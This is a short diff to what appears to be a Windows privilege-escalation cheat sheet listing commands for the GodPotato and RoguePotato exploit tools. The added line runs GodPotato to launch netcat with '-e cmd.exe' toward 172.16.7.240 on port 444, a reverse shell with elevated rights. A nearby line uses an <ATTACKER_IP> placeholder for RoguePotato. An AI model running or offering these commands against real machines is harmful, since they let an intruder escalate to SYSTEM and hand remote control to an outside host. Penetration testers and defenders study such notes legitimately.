@@ -69,6 +69,8 @@ net localgroup administrators
 # GodPotato (works on newer builds where PrintSpoofer fails)
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 
+.\GodPotato-NET4.exe -cmd "C:\users\public\nc.exe -e cmd.exe 172.16.7.240 444"
+
 # RoguePotato (needs external redirector)
 .\RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe /c whoami" -l 9999
 ```
